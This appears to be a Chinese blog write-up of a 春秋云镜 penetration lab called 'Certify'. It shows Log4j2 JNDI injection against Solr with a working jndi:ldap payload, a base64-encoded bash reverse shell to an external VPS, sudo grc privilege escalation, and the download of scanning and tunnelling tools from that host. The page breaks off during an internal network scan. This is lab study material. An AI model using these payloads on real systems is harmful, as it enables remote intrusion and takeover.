<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="考点 log4j2 jndi注入 grc提权 SMB 密码喷洒 spn ESC1  flag1老规矩扫一下端口 12345678910111213141516171819root@VM-16-12-ubuntu:&#x2F;opt# .&#x2F;fscan -h 39.98.115.144 -p 1-65535   ___                              _      &#x2F; _ \">
<meta property="og:type" content="article">
<meta property="og:title" content="春秋云镜Certify">
<meta property="og:url" content="https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/index.html">
<meta property="og:site_name" content="root@wanth3f1ag">
<meta property="og:description" content="考点 log4j2 jndi注入 grc提权 SMB 密码喷洒 spn ESC1  flag1老规矩扫一下端口 12345678910111213141516171819root@VM-16-12-ubuntu:&#x2F;opt# .&#x2F;fscan -h 39.98.115.144 -p 1-65535   ___                              _      &#x2F; _ \">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109113911025.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109114655188.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109140525754.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109142643191.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109142734380.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109142901592.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109142935587.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109144243090.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109144700319.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109144939693.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109145418967.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109151203291.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109151641730.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109151845072.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109152327851.png">
<meta property="article:published_time" content="2025-11-09T03:38:23.000Z">
<meta property="article:modified_time" content="2025-11-09T07:49:39.000Z">
<meta property="article:author" content="wanTh3flag">
<meta property="article:tag" content="Certify">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109113911025.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>春秋云镜Certify</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	

<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">H0me</a></li><!--
     --><!--
       --><li><a href="/about/">A6out</a></li><!--
     --><!--
       --><li><a href="/tags/">T6gs</a></li><!--
     --><!--
       --><li><a href="/categories/">Catagory</a></li><!--
     --><!--
       --><li><a href="/links/">L1nks</a></li><!--
     --><!--
       --><li><a href="/search/">s4arch</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/11/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&text=春秋云镜Certify"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&title=春秋云镜Certify"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&is_video=false&description=春秋云镜Certify"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=春秋云镜Certify&body=Check out this article: https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&title=春秋云镜Certify"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&title=春秋云镜Certify"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&title=春秋云镜Certify"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&title=春秋云镜Certify"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&name=春秋云镜Certify&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/11/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/&t=春秋云镜Certify"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">2.</span> <span class="toc-text">flag1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2021-44228"><span class="toc-number">2.1.</span> <span class="toc-text">CVE-2021-44228</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#grc%E6%8F%90%E6%9D%83"><span class="toc-number">2.2.</span> <span class="toc-text">grc提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">内网穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fscan%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F"><span class="toc-number">3.1.</span> <span class="toc-text">fscan内网扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E9%9A%A7%E9%81%93"><span class="toc-number">3.2.</span> <span class="toc-text">搭建隧道</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">4.</span> <span class="toc-text">flag2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6"><span class="toc-number">4.1.</span> <span class="toc-text">SMB共享文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3-flag4"><span class="toc-number">5.</span> <span class="toc-text">flag3&amp;flag4</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        春秋云镜Certify
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">wanTh3flag</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-11-09T03:38:23.000Z" class="dt-published" itemprop="datePublished">2025-11-09</time>
        
        (Updated: <time datetime="2025-11-09T07:49:39.000Z" class="dt-updated" itemprop="dateModified">2025-11-09</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">春秋云镜</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Certify/" rel="tag">Certify</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109113911025.png" alt="image-20251109113911025"></p>
<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
<li>log4j2 jndi注入</li>
<li>grc提权</li>
<li>SMB</li>
<li>密码喷洒</li>
<li>spn</li>
<li>ESC1</li>
</ul>
<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>老规矩扫一下端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/opt# ./fscan -h 39.98.115.144 -p 1-65535</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.4</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">39.98.115.144:22 open</span></span><br><span class="line"><span class="string">39.98.115.144:80 open</span></span><br><span class="line"><span class="string">39.98.115.144:8983 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 3</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] WebTitle http://39.98.115.144      code:200 len:612    title:Welcome to nginx!</span></span><br><span class="line"><span class="string">[*] WebTitle http://39.98.115.144:8983 code:302 len:0      title:None 跳转url: http://39.98.115.144:8983/solr/</span></span><br><span class="line"><span class="string">[*] WebTitle http://39.98.115.144:8983/solr/ code:200 len:16555  title:Solr Admin</span></span><br><span class="line"><span class="string">已完成 3/3</span></span><br><span class="line"><span class="string">[*] 扫描结束,耗时: 41.75680271s</span></span><br></pre></td></tr></table></figure>

<h3 id="CVE-2021-44228"><a href="#CVE-2021-44228" class="headerlink" title="CVE-2021-44228"></a>CVE-2021-44228</h3><p>访问8983端口发现使用了log4j2日志框架，找一下cve<a target="_blank" rel="noopener" href="https://www.cnblogs.com/fdxsec/p/17793755.html">https://www.cnblogs.com/fdxsec/p/17793755.html</a></p>
<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109114655188.png" alt="image-20251109114655188"></p>
<p>用yakit的dns服务器或者dnslog测试一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.98.115.144:8983/solr/admin/collections?action=<span class="variable">$&#123;jndi:ldap://xbboedbyid.lfcx.eu.org&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109140525754.png" alt="image-20251109140525754"></p>
<p>能进行dns外带，漏洞存在，那就直接打，jndi工具<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0">https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0</a></p>
<p>这个jar包要求是java8版本</p>
<p>关于工具的参数</p>
<ul>
<li><code>-C</code>：要执行的命令（Base64 编码）。</li>
<li><code>-A</code>：攻击者 IP（用于反弹 Shell）。</li>
</ul>
<p>然后我们进行反弹shell，记得vps需要开启LDAP服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 9999</span><br><span class="line"></span><br><span class="line">root@VM-16-12-ubuntu:/opt/javaexp# java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjI1LjE4Ni85OTk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A 124.223.25.186</span><br><span class="line">[ADDRESS] &gt;&gt; 124.223.25.186</span><br><span class="line">[COMMAND] &gt;&gt; bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIzLjI1LjE4Ni85OTk5IDA+JjE=&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">----------------------------JNDI Links---------------------------- </span><br><span class="line">Target environment(Build <span class="keyword">in</span> JDK whose trustURLCodebase is <span class="literal">false</span> and have Tomcat 8+ or SpringBoot 1.2.x+ <span class="keyword">in</span> classpath):</span><br><span class="line">rmi://124.223.25.186:1099/vanke4</span><br><span class="line">Target environment(Build <span class="keyword">in</span> JDK 1.8 whose trustURLCodebase is <span class="literal">true</span>):</span><br><span class="line">rmi://124.223.25.186:1099/hwwlod</span><br><span class="line">ldap://124.223.25.186:1389/hwwlod</span><br><span class="line">Target environment(Build <span class="keyword">in</span> JDK 1.7 whose trustURLCodebase is <span class="literal">true</span>):</span><br><span class="line">rmi://124.223.25.186:1099/21gfqn</span><br><span class="line">ldap://124.223.25.186:1389/21gfqn</span><br><span class="line"></span><br><span class="line">----------------------------Server Log----------------------------</span><br><span class="line">2025-11-09 14:25:32 [JETTYSERVER]&gt;&gt; Listening on 0.0.0.0:8180</span><br><span class="line">2025-11-09 14:25:32 [RMISERVER]  &gt;&gt; Listening on 0.0.0.0:1099</span><br><span class="line">2025-11-09 14:25:33 [LDAPSERVER] &gt;&gt; Listening on 0.0.0.0:1389</span><br></pre></td></tr></table></figure>

<p>根据jdk版本选择</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.98.115.144:8983/solr/admin/collections?action=<span class="variable">$&#123;jndi:ldap://124.223.25.186:1389/hwwlod&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109142643191.png" alt="image-20251109142643191"></p>
<p>权限比较低，尝试SUDO命令提权</p>
<h3 id="grc提权"><a href="#grc提权" class="headerlink" title="grc提权"></a>grc提权</h3><p>sudo -l 用于 列出当前用户可以执行的 sudo 命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">solr@ubuntu:/opt/solr/server$ <span class="built_in">sudo</span> -l</span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> solr on ubuntu:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User solr may run the following commands on ubuntu:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/grc</span><br></pre></td></tr></table></figure>

<p>看到一个grc，可以参考<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/grc/%E6%8F%90%E6%9D%83">https://gtfobins.github.io/gtfobins/grc/提权</a></p>
<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109142734380.png" alt="image-20251109142734380"></p>
<p>传入<code>sudo grc --pty /bin/sh</code>会开启一个shell，在里面执行命令就可以进行提权了</p>
<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109142901592.png" alt="image-20251109142901592"></p>
<p>或者sudo grc后面跟想要执行的命令也行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> grc <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251109142935587.png" alt="image-20251109142935587"></p>
<p>发现此时是root权限了，那我们读一下flag，通常在root目录下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">solr@ubuntu:/opt/solr/server$ <span class="built_in">sudo</span> grc --pty /bin/sh</span><br><span class="line"><span class="built_in">sudo</span> grc --pty /bin/sh</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/opt/solr-8.11.0/server</span><br><span class="line"><span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">flag</span><br><span class="line"><span class="built_in">cd</span> flag</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">flag01.txt</span><br><span class="line"><span class="built_in">cat</span> flag01.txt</span><br><span class="line">   ██████                   ██   ██   ████         </span><br><span class="line">  ██░░░░██                 ░██  ░░   ░██░   ██   ██</span><br><span class="line"> ██    ░░   █████  ██████ ██████ ██ ██████ ░░██ ██ </span><br><span class="line">░██        ██░░░██░░██░░█░░░██░ ░██░░░██░   ░░███  </span><br><span class="line">░██       ░███████ ░██ ░   ░██  ░██  ░██     ░██   </span><br><span class="line">░░██    ██░██░░░░  ░██     ░██  ░██  ░██     ██    </span><br><span class="line"> ░░██████ ░░██████░███     ░░██ ░██  ░██    ██     </span><br><span class="line">  ░░░░░░   ░░░░░░ ░░░       ░░  ░░   ░░    ░░      </span><br><span class="line"></span><br><span class="line">Easy right?</span><br><span class="line">Maybe you should dig into my core domain network.</span><br><span class="line"></span><br><span class="line">flag01: flag&#123;d575d1bb-9138-480b-9843-90d7fd033716&#125;</span><br></pre></td></tr></table></figure>

<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><p>一样的，通过wget把fscan和stowaway下进去</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"></span><br><span class="line">wget http://124.223.25.186/fscan</span><br><span class="line">wget http://124.223.25.186/linux_x64_agent</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x *</span><br></pre></td></tr></table></figure>

<h3 id="fscan内网扫描"><a href="#fscan内网扫描" class="headerlink" title="fscan内网扫描"></a>fscan内网扫描</h3><p>先看看内网ip</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.22.9.19  netmask 255.255.0.0  broadcast 172.22.255.255</span><br><span class="line">        inet6 fe80::216:3eff:fe24:ef8e  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:16:3e:24:ef:8e  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 129508  bytes 179709298 (179.7 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 25457  bytes 4922592 (4.9 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 1726  bytes 208939 (208.9 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 1726  bytes 208939 (208.9 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>

<p>用fscan扫一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.9.0/24</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.4</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.9.19     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.9.7      is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.9.26     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.9.47     is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 4</span></span><br><span class="line"><span class="string">172.22.9.26:139 open</span></span><br><span class="line"><span class="string">172.22.9.26:445 open</span></span><br><span class="line"><span class="string">172.22.9.47:445 open</span></span><br><span class="line"><span class="string">172.22.9.7:445 open</span></span><br><span class="line"><span class="string">172.22.9.7:139 open</span></span><br><span class="line"><span class="string">172.22.9.47:139 open</span></span><br><span class="line"><span class="string">172.22.9.26:135 open</span></span><br><span class="line"><span class="string">172.22.9.7:135 open</span></span><br><span class="line"><span class="string">172.22.9.47:80 open</span></span><br><span class="line"><span class="string">172.22.9.7:80 open</span></span><br><span class="line"><span class="string">172.22.9.47:22 open</span></span><br><span class="line"><span class="string">172.22.9.19:80 open</span></span><br><span class="line"><span class="string">172.22.9.47:21 open</span></span><br><span class="line"><span class="string">172.22.9.19:22 open</span></span><br><span 